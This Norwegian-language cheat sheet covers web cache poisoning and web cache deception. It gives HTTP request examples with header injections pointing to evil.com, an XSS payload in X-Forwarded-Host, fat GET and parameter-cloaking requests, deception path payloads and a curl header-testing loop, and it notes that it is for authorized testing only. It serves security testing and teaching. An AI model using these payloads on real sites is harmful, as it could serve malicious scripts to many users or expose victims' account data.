# 💾 Hurtigreferanse for forgiftning av webhurtigbuffer

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

> **Begreper og presisering:** En cache key avgjør hvilke forespørsler som deler en mellomlagret respons; unkeyed input inngår ikke i denne nøkkelen. Hvilke felt som er unkeyed, om responsen mellomlagres, og hvem som får den, avhenger av konfigurasjonen. Et reflektert headerfelt eller en cache-header er ikke alene bevis på forgiftning. En cb-parameter isolerer bare testen dersom den faktisk inngår i nøkkelen. Fat GET-eksemplets lengdefelt er bevart, ikke beregnet på nytt; det er en illustrasjon, ikke en verifisert bytekorrekt forespørsel. Se [PortSwiggers cache-veiledning](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).


## 🎯 Hva er cache poisoning?

**Forgiftning av webhurtigbufferen (web cache poisoning)** utnytter mellomlagring til å lagre ondsinnede responser som deretter leveres til andre brukere.

### Konsekvenser
- 🔴 **XSS mot mange brukere** – lagret XSS som leveres fra hurtigbufferen
- 🔴 **Endring av nettstedets innhold** – mellomlagre ondsinnet innhold
- 🔴 **Tjenestenekt** – mellomlagre feilresponser
- 🔴 **Omdirigeringsangrep** – send brukere til et annet nettsted

---

## 🔍 Forstå mellomlagring

### Hurtigbuffernøkler
```
# Vanligvis mellomlagret etter:
URL + Host-header

# Ikke inkludert i nøkkelen (unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Egendefinerte headere
```

### Identifiser mellomlagring
```bash
# Se etter headere for hurtigbuffer
curl -I https://target.com

# Tegn på mellomlagring:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Injeksjon via headere utenfor hurtigbuffernøkkelen

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Hvis responsen gjengir evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Kan føre til omdirigering eller protokollforvirring
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Se etter gjengivelse av inndata
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Omgå begrensninger på sti
```

---

## 🔥 Angrepsteknikker

### Grunnleggende XSS via forgiftet hurtigbuffer
```http
# 1. Finn inndata utenfor nøkkelen som gjengis i responsen
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. Responsen mellomlagres med XSS
# 3. Brukere får XSS fra hurtigbufferen
```

### Forgiftning via sti
```http
# Forespørsel med andre stier hos opprinnelsesserveren
GET /page;evil HTTP/1.1
Host: target.com

# Kan mellomlagres med en annen nøkkel enn forventet
```

### GET-forespørsler med kropp (fat GET)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# Kroppen kan påvirke responsen uten å påvirke hurtigbuffernøkkelen
```

### Skjuling av parametere
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Ulik tolking i hurtigbufferen og applikasjonen
```

---

## 🛠️ Web cache deception (villedning av hurtigbuffer)

### Forskjellig fra forgiftning!
```
# Forgiftning: Angriperens payload mellomlagres for ofrene
# Villedning: Offerets data mellomlagres for angriperen

# Trinn ved web cache deception:
1. Få offeret til å besøke: /account/settings.css
2. Serveren returnerer /account/settings (ignorerer .css)
3. Hurtigbufferen lagrer som offentlig ressurs
4. Angriperen henter /account/settings.css fra hurtigbufferen
5. Får offerets sensitive data
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Teknikk for å skille testforespørsler (cache buster)

### Til testing
```http
# Legg til cache buster for å unngå å påvirke andre brukere
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Hver test får en unik hurtigbuffernøkkel
```

---

## 🛠️ Verktøy

### Param Miner (Burp-utvidelse)
```
1. Installer Param Miner fra BApp Store
2. Høyreklikk på forespørselen → Extensions → Param Miner
3. "Guess headers"
4. Se etter headere som ikke inngår i nøkkelen
```

### Manuell testing
```bash
# Test headere
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Vanlige headere utenfor hurtigbuffernøkkelen

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Ressurser

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research](https://portswigger.net/research/practical-web-cache-poisoning)
- [Web Cache Deception](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 Undersøk forgiftning av hurtigbufferen!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
